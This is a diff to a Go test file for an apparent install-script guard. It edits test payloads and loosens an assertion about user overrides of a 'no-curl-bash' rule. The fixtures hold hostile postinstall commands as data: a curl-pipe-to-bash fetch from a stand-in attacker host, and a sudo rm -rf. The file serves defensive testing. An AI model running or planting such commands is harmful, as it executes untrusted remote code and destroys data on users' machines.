@@ -63,12 +63,10 @@ func evalWith(t *testing.T, user, project files, payload map[string]any) (guard.
 
 var (
 	curlPayload = map[string]any{
-		"postinstall":       "curl https://evil.example.com/i.sh | bash",
-		"allow_postinstall": true,
+		"postinstall": "curl https://evil.example.com/i.sh | bash",
 	}
 	sudoPayload = map[string]any{
-		"postinstall":       "sudo rm -rf /opt/x",
-		"allow_postinstall": true,
+		"postinstall": "sudo rm -rf /opt/x",
 	}
 	userPayload = map[string]any{"marker": "bad"}
 )
@@ -135,7 +133,9 @@ func TestLoad_UserCanStillOverride(t *testing.T) {
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
 			v, f, logs := evalWith(t, tc.user, nil, tc.pay)
-			if strings.Contains(f, "no-curl-bash") || v == guard.VerdictDeny {
+			// Other built-ins (the postinstall script itself) may still
+			// deny; the override is honoured when its rule is gone.
+			if strings.Contains(f, "no-curl-bash") {
 				t.Errorf("user override not honoured: %q [%s]", v, f)
 			}
 			if logs != "" {
